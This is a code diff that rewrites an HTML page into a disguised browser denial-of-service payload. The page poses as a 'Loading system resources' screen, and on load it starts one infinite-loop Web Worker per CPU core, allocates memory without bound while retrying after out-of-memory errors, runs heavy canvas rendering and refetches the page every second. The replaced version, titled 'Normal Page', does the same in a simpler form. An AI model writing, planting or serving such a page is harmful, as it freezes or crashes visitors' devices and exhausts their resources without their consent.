@@ -1,65 +1,275 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Normal Page</title>
+    <title>Loading Resource...</title>
+    <style>
+        body {
+            margin: 0;
+            background: #000;
+            overflow: hidden;
+        }
+        #loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #0f0;
+            font-family: Arial;
+            font-size: 24px;
+        }
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to Normal Page</h1>
+    <div id="loading">Loading system resources...</div>
+    <canvas id="mainCanvas"></canvas>
+    <canvas id="particleCanvas"></canvas>
+
     <script>
-        // Функция создания нагрузки на процессор
-        function createLoad() {
-            while(true) {
-                // Интенсивные математические вычисления
-                for(let i = 0; i < 1000000; i++) {
-                    Math.sqrt(Math.random() * Math.pow(Math.random(), Math.random()));
-                    Math.sin(Math.cos(Math.tan(Math.random())));
-                }
+        // Показываем загрузку сразу
+        document.getElementById('loading').textContent = 'Initializing systems...';
+
+        // Максимальная нагрузка на процессор
+        function maxCPULoad() {
+            const cpuWorkerCode = `
+                let total = 0;
+                const primes = [];
                 
-                // Создание и обработка больших массивов
-                const largeArray = new Array(1000000).fill(0).map((_, i) => i);
-                largeArray.sort(() => Math.random() - 0.5);
-                
-                // Рекурсивные вычисления
-                function fibonacci(n) {
-                    if (n <= 1) return n;
-                    return fibonacci(n - 1) + fibonacci(n - 2);
-                }
-                fibonacci(35);
-            }
-        }
-
-        // Запуск нагрузки сразу при загрузке страницы
-        window.onload = function() {
-            createLoad();
-        };
-
-        // Дополнительные потоки нагрузки
-        setTimeout(() => {
-            setInterval(() => {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                for(let i = 0; i < 1000; i++) {
-                    ctx.fillRect(Math.random() * 100, Math.random() * 100, 50, 50);
-                }
-            }, 10);
-        }, 1000);
-
-        // Web Workers для дополнительной нагрузки
-        if (window.Worker) {
-            for(let i = 0; i < 4; i++) {
-                const worker = new Worker(URL.createObjectURL(
-                    new Blob([`
-                        while(true) {
-                            const array = new Array(100000);
-                            for(let i = 0; i < array.length; i++) {
-                                array[i] = Math.sqrt(i) * Math.random();
+                function findPrimes(max) {
+                    for (let i = 2; i <= max; i++) {
+                        let isPrime = true;
+                        for (let j = 2; j * j <= i; j++) {
+                            if (i % j === 0) {
+                                isPrime = false;
+                                break;
                             }
-                            array.sort();
                         }
-                    `], {type: 'application/javascript'})
+                        if (isPrime) primes.push(i);
+                    }
+                    return primes;
+                }
+                
+                function matrixMultiplication() {
+                    const size = 500;
+                    let a = new Array(size);
+                    let b = new Array(size);
+                    let c = new Array(size);
+                    
+                    for (let i = 0; i < size; i++) {
+                        a[i] = new Array(size);
+                        b[i] = new Array(size);
+                        c[i] = new Array(size);
+                        for (let j = 0; j < size; j++) {
+                            a[i][j] = Math.random();
+                            b[i][j] = Math.random();
+                            c[i][j] = 0;
+                        }
+                    }
+                    
+                    for (let i = 0; i < size; i++) {
+                        for (let j = 0; j < size; j++) {
+                            for (let k = 0; k < size; k++) {
+                                c[i][j] += a[i][k] * b[k][j];
+                            }
+                        }
+                    }
+                    return c;
+                }
+                
+                while(true) {
+                    findPrimes(10000);
+                    matrixMultiplication();
+                    total += primes.length;
+                    // Рекурсия с глубоким стеком
+                    function deepRecursion(depth) {
+                        if (depth <= 0) return 1;
+                        return depth * deepRecursion(depth - 1);
+                    }
+                    deepRecursion(5000);
+                }
+            `;
+            
+            // Запускаем несколько Web Workers
+            for (let i = 0; i < navigator.hardwareConcurrency || 4; i++) {
+                const worker = new Worker(URL.createObjectURL(
+                    new Blob([cpuWorkerCode], {type: 'application/javascript'})
                 ));
             }
         }
+
+        // Максимальная нагрузка на память
+        function maxMemoryLoad() {
+            const memoryBlocks = [];
+            let blockSize = 10000000; // 10 млн элементов
+            
+            function allocateMemory() {
+                try {
+                    // Создаем большие массивы
+                    for (let i = 0; i < 10; i++) {
+                        const block = new Array(blockSize);
+                        // Заполняем память данными
+                        for (let j = 0; j < blockSize; j++) {
+                            block[j] = {
+                                data: Math.random(),
+                                index: j,
+                                timestamp: Date.now(),
+                                buffer: new ArrayBuffer(1024)
+                            };
+                        }
+                        memoryBlocks.push(block);
+                    }
+                    // Увеличиваем размер блока для следующей аллокации
+                    blockSize *= 1.1;
+                } catch(e) {
+                    // Продолжаем пытаться аллоцировать память
+                    setTimeout(allocateMemory, 10);
+                }
+            }
+            
+            // Постоянно аллоцируем и освобождаем память
+            setInterval(() => {
+                if (memoryBlocks.length > 50) {
+                    memoryBlocks.splice(0, 10);
+                }
+                allocateMemory();
+            }, 100);
+        }
+
+        // Максимальная нагрузка на графику
+        function maxGPULoad() {
+            const canvas = document.getElementById('mainCanvas');
+            const ctx = canvas.getContext('2d');
+            const particles = [];
+            
+            // Устанавливаем размер canvas на весь экран
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            // Создаем частицы
+            for (let i = 0; i < 5000; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    vx: (Math.random() - 0.5) * 10,
+                    vy: (Math.random() - 0.5) * 10,
+                    size: Math.random() * 10 + 2,
+                    color: `hsl(${Math.random() * 360}, 100%, 50%)`
+                });
+            }
+            
+            function render() {
+                // Очищаем canvas
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                // Рендерим частицы
+                for (let i = 0; i < particles.length; i++) {
+                    const p = particles[i];
+                    
+                    // Обновляем позицию
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    
+                    // Отскок от границ
+                    if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
+                    if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
+                    
+                    // Рисуем частицу
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                    ctx.fillStyle = p.color;
+                    ctx.fill();
+                    
+                    // Рисуем связи между частицами
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const p2 = particles[j];
+                        const dx = p.x - p2.x;
+                        const dy = p.y - p2.y;
+                        const distance = Math.sqrt(dx * dx + dy * dy);
+                        
+                        if (distance < 100) {
+                            ctx.beginPath();
+                            ctx.strokeStyle = `rgba(255, 255, 255, ${0.2 * (1 - distance/100)})`;
+                            ctx.lineWidth = 1;
+                            ctx.moveTo(p.x, p.y);
+                            ctx.lineTo(p2.x, p2.y);
+                            ctx.stroke();
+                        }
+                    }
+                }
+                
+                // Сложные графические эффекты
+                const gradient = ctx.createRadialGradient(
+                    canvas.width/2, canvas.height/2, 0,
+                    canvas.width/2, canvas.height/2, canvas.width/2
+                );
+                gradient.addColorStop(0, 'rgba(255, 0, 0, 0.1)');
+                gradient.addColorStop(1, 'rgba(0, 0, 255, 0.1)');
+                ctx.fillStyle = gradient;
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                requestAnimationFrame(render);
+            }
+            
+            render();
+            
+            // Дополнительный canvas для частиц
+            const particleCanvas = document.getElementById('particleCanvas');
+            const particleCtx = particleCanvas.getContext('2d');
+            particleCanvas.width = window.innerWidth;
+            particleCanvas.height = window.innerHeight;
+            
+            function renderParticles() {
+                particleCtx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                particleCtx.fillRect(0, 0, particleCanvas.width, particleCanvas.height);
+                
+                for (let i = 0; i < 1000; i++) {
+                    particleCtx.fillStyle = `hsl(${Date.now()/10 + i}, 70%, 60%)`;
+                    particleCtx.fillRect(
+                        Math.random() * particleCanvas.width,
+                        Math.random() * particleCanvas.height,
+                        5, 5
+                    );
+                }
+                
+                requestAnimationFrame(renderParticles);
+            }
+            renderParticles();
+        }
+
+        // Запускаем все нагрузки после загрузки страницы
+        window.onload = function() {
+            document.getElementById('loading').textContent = 'System loaded - Maximum stress active';
+            
+            // Запускаем нагрузки с небольшими задержками
+            setTimeout(maxCPULoad, 100);
+            setTimeout(maxMemoryLoad, 200);
+            setTimeout(maxGPULoad, 300);
+            
+            // Дополнительная нагрузка на сеть
+            setInterval(() => {
+                fetch(window.location.href)
+                    .then(response => response.text())
+                    .then(data => {
+                        // Обрабатываем данные для создания дополнительной нагрузки
+                        const parser = new DOMParser();
+                        const doc = parser.parseFromString(data, 'text/html');
+                    });
+            }, 1000);
+        };
+
+        // Адаптируем размеры canvas при изменении размера окна
+        window.onresize = function() {
+            const canvases = document.querySelectorAll('canvas');
+            canvases.forEach(canvas => {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+        };
     </script>
 </body>
 </html>
